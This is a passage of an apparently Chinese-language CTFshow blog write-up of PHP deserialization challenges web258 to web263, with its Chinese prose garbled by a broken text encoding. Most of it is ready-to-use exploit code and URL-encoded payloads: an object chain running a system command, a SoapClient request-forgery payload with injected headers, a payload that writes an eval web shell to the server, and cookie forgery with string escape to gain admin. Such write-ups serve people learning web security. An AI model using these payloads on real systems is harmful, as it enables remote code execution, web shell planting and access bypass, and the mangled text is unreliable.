class="line"></span><br></pre></td></tr></table></figure><p>expä¸ä¸Šé¢˜åŸºæœ¬ä¸€è‡´ï¼Œæ³¨æ„å˜æ›´ä¸º<code>public</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = <span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="comment">// print_r(serialize($a).PHP_EOL);</span></span><br><span class="line"><span class="comment">// O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:23:&quot;system(&quot;tac flag.php&quot;);&quot;;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//åœ¨ä¸¤å¤„O:åé¢æ·»åŠ +åurlç¼–ç ä¸€ä¸‹å³å¯</span></span><br><span class="line"><span class="comment">// O:+11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:23:&quot;system(&quot;tac flag.php&quot;);&quot;;&#125;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="string">&#x27;O:+11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:+8:&quot;backDoor&quot;:1:&#123;s:4:&quot;code&quot;;s:23:&quot;system(&quot;tac flag.php&quot;);&quot;;&#125;&#125;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?username=a&amp;password=a</span><br><span class="line">Cookie:</span><br><span class="line">user=O%3A%2B11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A23%3A%22system(%22tac%20flag.php%22)%3B%22%3B%7D%7D</span><br></pre></td></tr></table></figure><h2 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h2><p><code>flag.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åª<code>XFF</code>æ²¡ç”¨ï¼Œä¼°è®¡è¿˜åˆ¤æ–­äº†ä¸‹çœŸå®<code>ip</code></p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè°ƒç”¨<code>call</code>ï¼Œæ•…ä½¿ç”¨åŸç”Ÿç±»</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-form-urlencoded\r\nContent-Length:13\r\n\r\ntoken=ctfshow&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$soapclient</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>, <span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$soapclient</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code>ï¼Œç„¶åè®¿é—®<code>flag.txt</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?vip=O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A138%3A%22ctfshow%0D%0AX-Forwarded-For%3A127.0.0.1%2C127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure><h2 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h2><p>åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­å«æœ‰<code>ctfshow_i_love_36D</code>å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ctfshow=ctfshow_i_love_36D</span><br></pre></td></tr></table></figure><h2 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!=<span class="string">&#x27;&#x27;</span> || <span class="variable language_">$this</span>-&gt;password!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable language_">$this</span>-&gt;code = <span class="variable language_">$this</span>-&gt;username.<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>å½“ååºåˆ—åŒ–æ—¶ä¼šè¿›å…¥<code>__unserialize</code>ä¸­ï¼Œè€Œä¸”<code>__invoke</code>æ— æ³•åˆ©ç”¨ï¼Œæ•…ç›´æ¥å†™ğŸã€‚<code>0x3d</code>æ˜¯å¼±ç±»å‹æ¯”è¾ƒã€‚</p><p>ç¼–å†™<code>exp</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;username = <span class="string">&#x27;877.php&#x27;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;password = <span class="string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆ<code>payload</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?vip=O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5Ba%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3BN%3B%7D</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨<code>877.php</code>å³å¯</p><h2 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;msg&#x27;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$umsg</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p><code>message.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¾ç½®<code>Cookie</code>ä¸­çš„<code>msg</code>å­—æ®µï¼Œä½¿<code>token=admin</code>å³å¯</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥æ‰“<code>message.php</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/message.php</span><br><span class="line">Cookie:</span><br><span class="line">msg=Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO047czozOiJtc2ciO047czoyOiJ0byI7TjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²é€ƒé€¸</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$s</span>.<span class="string">&#x27;fuck&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$s</span>.<span class="variable">$str</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$s</span>.PHP_EOL;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">message</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;to = <span class="variable">$s</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>).PHP_EOL;</span><br><span class="line"><span class="variable">$umsg</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$umsg</span>.PHP_EOL;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ¯æ¬¡æ›¿æ¢ä¼šç»™å‡ºä¸€ä¸ªå­—ç¬¦çš„ç©ºï¼Œè€Œè¦ä½¿å¾—<code>token=admin</code>å°±éœ€è¦å°¾éƒ¨æ‹¼æ¥ä¸Š<code>&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</code>ï¼Œæ€»å…±éœ€è¦<code>27</code>ä¸ªå­—ç¬¦çš„ç©ºé—´ï¼Œæ•…æ‹¼æ¥<code>27</code>ä¸ª<code>fuck</code>è®©å®ƒè¢«æ›¿æ¢å°±å¯ä»¥äº†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?f=1&amp;m=1&amp;t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h2><p>è®¿é—®<code>www.zip</code>è·å¾—æºç å‹ç¼©åŒ…ï¼Œä¸‹é¢æ˜¯å…³é”®æ–‡ä»¶ä»£ç </p><p><code>index.php</code>ï¼Œè¿™é‡Œè¦æ³¨æ„å®ƒçš„<code>limit</code>å†™æˆäº†<code>limti</code>ï¼Œæ‰€ä»¥ä¸ä¼šè¶…è¿‡é™åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">//è¶…è¿‡5æ¬¡ç¦æ­¢ç™»é™†</span><br><span class="line">if(isset($_SESSION[&#x27;limit&#x27;]))&#123;</span><br><span class="line">$_SESSION[&#x27;limti&#x27;]&gt;5?die(&quot;ç™»é™†å¤±è´¥æ¬¡æ•°è¶…è¿‡é™åˆ¶&quot;):$_SESSION[&#x27;limit&#x27;]=base64_decode($_COOKIE[&#x27;limit&#x27;]);</span><br><span class="line">$_COOKIE[&#x27;limit&#x27;] = base64_encode(base64_decode($_COOKIE[&#x27;limit&#x27;]) +1);</span><br><span class="line">&#125;else&#123;</span><br><span class="line"> setcookie(&quot;limit&quot;,base64_encode(&#x27;1&#x27;));</span><br><span class="line"> $_SESSION[&#x27;limit&#x27;]= 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;initial-scale=1,maximum-scale=1, minimum-scale=1&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;apple-mobile-web-app-capable&quot; content=&quot;yes&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no&quot;&gt;</span><br><span class="line">&lt;title&gt;ctfshowç™»é™†&lt;/title&gt;</span><br><span class="line">&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;pc-kk-form&quot;&gt;</span><br><span class="line">&lt;center&gt;&lt;h1&gt;CTFshow ç™»é™†&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;&quot; onsubmit=&quot;return false;&quot;&gt;</span><br><span class="line">&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">&lt;input id=&quot;u&quot; type=&quot;text&quot; placeholder=&quot;ç”¨æˆ·å&quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;pc-kk-form-list&quot;&gt;</span><br><span class="line">&lt;input id=&quot;pass&quot; type=&quot;password&quot; placeholder=&quot;å¯†ç &quot;&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;pc-kk-form-btn&quot;&gt;</span><br><span class="line">&lt;button onclick=&quot;check();&quot;&gt;ç™»é™†&lt;/button&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line">function check()&#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:&#x27;check.php&#x27;,</span><br><span class="line">type: &#x27;GET&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">&#x27;u&#x27;:$(&#x27;#u&#x27;).val(),</span><br><span class="line">&#x27;pass&#x27;:$(&#x27;#pass&#x27;).val()</span><br><span class="line">&#125;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">alert(JSON.parse(data).msg);</span><br><span class="line">&#125;,</span><br><span class="line">error:function(data)&#123;</span><br><span class="line">alert(JSON.parse(data).msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>check.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span 